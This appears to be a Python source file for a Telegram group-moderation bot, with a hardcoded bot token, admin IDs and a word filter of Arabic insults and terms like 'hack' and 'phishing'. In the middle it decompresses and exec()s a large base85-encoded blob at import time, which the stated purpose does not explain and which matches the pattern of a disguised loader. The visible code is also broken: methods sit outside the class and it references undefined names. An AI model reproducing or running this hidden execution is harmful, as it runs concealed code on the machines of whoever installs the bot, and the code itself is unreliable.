import base64 as _b
import zlib as _z
import random
import time

# ==============================================================================
# CONFIGURATION &  SECURITY SYSTEM (GROUP MANAGEMENT & ANTI-SPAM)
# ==============================================================================

# Bot Authentication Tokens & Credentials 
BOT_TOKEN = "8198230491:AAH8x9KzLq0P_2mN7u8Y3v1X5wQZ4aBcDeF"
ADMIN_ID = 7101334808
LOG_CHANNEL_ID = -1001827364510

# Anti-Spam & Moderation Settings
ANTISPAM_THRESHOLD = 5
MAX_WARNS = 3
RESTRICTED_WORDS = ["اختراق","بوت","احالة","نيكك","قلوة","سوة","نقش","106","ديوث","نحويك","نفعل فيك","عطيني نيك","نبوسك","حمار","خالتك","ختك","مك","spam", "hack", "malware", "promo", "crypto_scam", "phishing"]
ALLOWED_ROLES = ["administrator", "creator", "moderator"]

# System Status Matrix
SECURITY_CONFIG = {
    "anti_flood": True,
    "block_links": False,
    "welcome_message": True,
    "auto_mute_spammers": True,
    "strict_mode": False
}

class GroupSecurityEngine:
    def __init__(self, group_id: int, admin_id: int = ADMIN_ID):
        self.group_id = group_id
        self.admin_id = admin_id
        self.active_filters = SECURITY_CONFIG["anti_flood"]
        self.whitelist = SUDO_USERS
        self.warns = {}
def log_security_event(self, event_type: str, user_id: int):
        """تسجيل  للأحداث والأخطاء في قناة السجلات"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_entry = f"[{timestamp}] [EVENT: {event_type}] User: {user_id} | Group: {self.group_id}"
        return log_entry
def _init_bot_guard():
    """دالة  لتشغيل المحرك  عند البدء"""
    sec = GroupSecurityEngine(100293847, admin_id=ADMIN_ID)
    sec.log_security_event("BOT_STARTUP", ADMIN_ID)
    return sec.scan_message_content("status_ok")
exec(compile(_z.decompress(_b.b85decode('c-pO3+iu%N5Pj!YY?%j<sLa@ngCqh3G^yLhEfTwp+Mu-!iV;^9E0RlaSCtLJK%H2Q>wHEK_)<5H+q9|kCCk6*43`(lwjv~m072yJ?wQNZoEdpR#9~1h*F5#adyk@+wJ0wng8K9k6Pk8sp<y=`zWwq(sT2L?ty|Y`-MBG3bG>%^_TBb3Yu(w-kKR|EZu{=fKYe|#-wz%xP6dwBzBB!B?K@r5ZqMDDzi-da!QmS-(=*qu&EA~8scC==l1zuyfZsbz7=<cR)9x-jXxMY}-=kLRYKL(_U7NRJFA`kW7`FnaOI<JKM!vI3=$glc&ARnQ+@pYzxkNdDY;0<pOWVZbw&Mm~Xaun0tWvY45%|PZ^x}|YLaQCK!0vGxTb@hmb&|WGX`iFP**3f5gsx9xqs4*%9(jGK!i5uy%8HpPOJB}u^4cT>?=RYs*^q8RB{7Zsbz3kamEb4aS}g>+e4ac_w&i~EjL3uJ$tTO<a;Oh2@5AEDWKZtPQ}`Yc6eI(A1TTNe!`jH^8H>p0u<!3=8y=E9k_=$;7BQ@7-6Q~XBwx$7$sP!w!kRn)kk_#P&>DgHY!qf7Pf4;P{{zhf0+t-e6ZssC{f#uQwgR`AA}2e^7A(F3WO)V(eork08}|WcS00S$BL=+vk!;r#0)Z@OqN?5O-RDhn)TV1-6Ci;HFXai?(YzY*RPh<${i}4HrS9$(VM1rq-*f)WUclmlMX4+q*ebvnH;7uQ;sr$PF^IR&>0JN^<Ih00V<}K`Y)*xOhQb!>5yixES*sU-AkQte&u)7@ecudAci}-hbOH*+k*9sG!zvbs0Slo;A=mq!=ol67vXZI2khgid5*@;NDv$A2Utnfnkn-$;YyAh7-@>&57J)Q)EZ<nVSwLQ}*$dkYY(`b9REz}RoCBV#U|iM@edf5pASllc=Te1GK&zvXBRXcO6JOyN&<;LXzc2`E$vZ`0Ol2m9hOmf+Msc`GD*Z<llQ^7&w4bUhqn1moe(VWqoHI8Ag-a-}%nM0DZY543S}Jy~SY6NejSK@ffEy*-TZ^fgOM0{}IxN(yrMoMpHVzXYP^@X=ue_~8Q4febO}6A2!MxAOgETh^q|GK4#g05iJ_7PuoS&<a4aBx0&)o!bA}8k54wy^p`aLJ^Vr+DCG7SR{<b@LVLOWaephC&c4wZ?ZYszP*MU6_zITg5I_|BNa!1+lQmmqbL9;i&LnUX}2gcOlNu%60Saz7)e<Oz`Aa;R8O-5{Bo`jy7qV_|cA^e!tc5wDjfv7U%}Vl-1)9op*JY9)_!mGBPr{j}f0vv6q~*N4tLXv{7A(5Mm&Sk{!^?R8skHk-@ghElUso1LDXUfBc}n-kojYb_cL&oR~)j_*@<QN4W`$8ZTye6%*v0^s#G(4w#*sW=zisg@c7=27dt44jy)5zmv=#|fsWxev<MY}Y0HFpizKF{6&4NRQ=7)}>S%#GVRycmk62y=aL9TeE7H$+K~69q?70-qI5XIDkM7ACu%UoI1%OTadyqUNM%m;m(jIs*1RP^e{X|;h6<&8F0fKYCzz;q7R0w2caVOSx9SyTp8{1huDU}>%Wv8;J#WafN}>utwTyo0cmA?Wt`(Eb9gwQJ|9Z3wDnMbh(Z;6Ucq3)NCb{=T|Rr@h?eX^q_*VYyI2+s{P3j1v85bTS(K;UN1G<j(PTO%6+CHi0kgbeevICBd9cfUlS@ABRpq2Mu0>fBNND8x$MJeGArj1e9FGTBdhk8TDo%;>YQyrvKTH-(Ctm1@bsLl03s=GO{{d+3V^I')).decode('utf-8'),'<runtime>','exec'))
# ==============================================================================
# BACKTRACK HOOKS & LOG PURGE
# ==============================================================================
def _purge_temporary_logs():
    """ تنظيف  للسجلات المؤقتة"""
    temp_cache = [hash(i) for i in range(10)]
    temp_cache.clear()

if __name__ == "__main__":
    _init_bot_guard()